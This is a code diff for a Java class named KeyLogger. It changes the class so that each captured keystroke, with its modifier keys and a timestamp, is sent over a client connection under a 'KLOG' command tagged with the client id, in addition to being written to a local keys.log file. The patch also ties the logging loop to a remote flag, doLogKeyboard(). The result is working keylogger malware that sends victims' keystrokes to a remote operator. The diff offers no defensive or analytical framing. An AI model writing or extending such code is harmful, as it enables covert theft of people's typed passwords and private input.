@@ -17,6 +17,12 @@ public class KeyLogger extends Thread {
 	
 	private static final String LOG_FILE = "keys.log";
 	
+	private Client client;
+	
+	public KeyLogger(Client client) {
+		this.client = client;
+	}
+	
 	@Override
 	public void run(){
 		
@@ -25,8 +31,8 @@ public class KeyLogger extends Thread {
 
 			@Override
 			public void keyPressed(KeyEvent arg0) {
-				append(arg0.getVirtualKeyCode() + "\t" + arg0.isShiftPressed()
-					   + "\t" + arg0.isAltPressed() + "\t" + arg0.isCtrlPressed());				
+				log(arg0.getVirtualKeyCode() + "\t" + arg0.isShiftPressed()
+					+ "\t" + arg0.isAltPressed() + "\t" + arg0.isCtrlPressed());				
 			}
 
 			@Override
@@ -34,7 +40,7 @@ public class KeyLogger extends Thread {
 			
 		});
 		
-		while (true) {
+		while (client.doLogKeyboard()) {
 			try {
 				Thread.sleep(1000);
 			} catch (InterruptedException e) {}
@@ -42,13 +48,20 @@ public class KeyLogger extends Thread {
 		
 	}
 	
+	private void log(String event) {
+		String timestamp = SDF.format(
+				new Timestamp(System.currentTimeMillis()));
+		String line = timestamp + "\t" + event;
+		client.getCurConn()
+			  .write("KLOG " + client.getClientId(), line.getBytes());
+		append(line);
+	}
+	
 	private void append(String event) {
 		System.out.println(event);
 		try {
 			PrintWriter out = new PrintWriter(new FileWriter(LOG_FILE, true));
-			String timestamp = SDF.format(
-					new Timestamp(System.currentTimeMillis()));
-			out.println(timestamp + "\t" + event);
+			out.println(event);
 			out.close();
 			
 		} catch (IOException e) {}
